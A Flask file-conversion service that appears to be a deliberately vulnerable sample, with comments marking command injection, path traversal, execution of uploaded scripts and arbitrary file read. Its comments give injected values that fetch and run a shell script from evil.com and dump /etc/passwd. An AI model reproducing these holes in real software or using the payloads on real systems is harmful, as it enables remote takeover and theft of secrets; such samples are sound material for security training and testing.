"""File processing service — handles document uploads and conversion."""
import os, subprocess, shutil
from pathlib import Path
from flask import Flask, request, jsonify, send_file

app         = Flask(__name__)
UPLOAD_DIR  = "/tmp/uploads"

@app.route("/api/convert", methods=["POST"])
def convert_document():
    """Convert uploaded document using system tools."""
    filename = request.form.get("filename")
    fmt      = request.form.get("format", "pdf")

    # CRITICAL VULN: direct OS command injection
    # Attacker sends: filename = "doc.pdf; curl https://evil.com/shell.sh | bash"
    # fmt = "pdf; cat /etc/passwd > /tmp/leaked.txt"
    result = os.system(f"convert {filename} -format {fmt} /tmp/output.{fmt}")

    if result != 0:
        # VULN: also has RCE via subprocess with shell=True
        out = subprocess.run(
            f"libreoffice --headless --convert-to {fmt} {filename}",
            shell=True, capture_output=True, text=True
        )
        return jsonify({"result": out.stdout, "stderr": out.stderr})

    return jsonify({"status": "converted", "output": f"/tmp/output.{fmt}"})


@app.route("/api/upload", methods=["POST"])
def upload_file():
    """Accept file upload — no type or size restrictions."""
    f    = request.files.get("file")
    name = f.filename  # VULN: uses attacker-controlled filename directly

    # VULN: no path sanitization — path traversal
    # Attacker sends filename: ../../etc/cron.d/backdoor
    dest = Path(UPLOAD_DIR) / name
    f.save(str(dest))

    # VULN: executes uploaded file if it looks like a script
    if name.endswith((".py", ".sh", ".rb")):
        os.system(f"python3 {dest}")    # RCE via uploaded script

    return jsonify({"saved": str(dest)})


@app.route("/api/read", methods=["GET"])
def read_file():
    """Read a file from the server."""
    path = request.args.get("path")

    # VULN: arbitrary file read — no path restrictions
    # Attacker reads: /etc/passwd, /proc/1/environ, settings.py
    with open(path, "r") as fh:
        return fh.read()
